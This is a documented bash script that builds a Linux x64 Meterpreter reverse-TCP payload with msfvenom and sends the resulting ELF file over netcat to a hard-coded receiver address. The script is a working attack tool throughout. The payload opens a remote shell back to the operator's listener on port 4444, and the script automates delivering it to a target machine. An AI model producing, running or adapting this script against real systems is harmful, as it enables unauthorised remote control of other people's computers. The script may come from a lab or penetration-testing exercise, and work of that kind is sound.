#!/bin/bash

# sender.sh - A script to create and send a Meterpreter reverse shell payload.
#
# Usage:
#   ./sender.sh <LHOST>
#   - LHOST: The IP address of the sender (local host) to be used in the payload.
#
# Description:
#   This script automates the process of creating a Meterpreter reverse shell payload
#   for Linux x64 systems using msfvenom, and then sends the generated payload to a
#   specified receiver using netcat.
#
# Variables:
#   - LHOST: The IP address of the sender (passed as the first argument to the script).
#   - LPORT: The port on which the reverse shell will connect back to the sender (default: 4444).
#   - FILE_PATH: The file path where the generated payload will be saved.
#   - RECEIVER_IP: The IP address of the receiver to which the payload will be sent.
#   - RECEIVER_PORT: The port on the receiver to which the payload will be sent.
#
# Workflow:
#   1. Generate a Meterpreter reverse shell payload using msfvenom.
#   2. Save the payload as an ELF file at the specified file path.
#   3. Use netcat to send the payload file to the receiver.
#
# Exit Codes:
#   - 0: Success.
#   - 1: Failure in creating the payload or sending the file.
#
# Prerequisites:
#   - msfvenom must be installed and available in the system's PATH.
#   - netcat (nc) must be installed and available in the system's PATH.
#
# Note:
#   Ensure that the receiver is ready to accept the file on the specified port
#   before running this script.

LHOST="$1"  # Sender IP
LPORT="4444"           # Listener Port for msfvenom
FILE_PATH="/home/kali/Documents/meterpreter_reverse_x64.elf"
RECEIVER_IP="192.168.0.28"  # Receiver IP
RECEIVER_PORT="1234"        # Port to send the file to

# Create the payload file
echo "Creating meterpreter payload..."
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf > "$FILE_PATH"

if [ $? -eq 0 ]; then
    echo "Payload created successfully at $FILE_PATH."
else
    echo "Failed to create payload. Exiting."
    exit 1
fi

# Send the file using netcat
echo "Sending the file to $RECEIVER_IP:$RECEIVER_PORT..."
cat "$FILE_PATH" | nc -w 3 "$RECEIVER_IP" "$RECEIVER_PORT"

if [ $? -eq 0 ]; then
    echo "File sent successfully."
else
    echo "Failed to send file."
    exit 1
fi
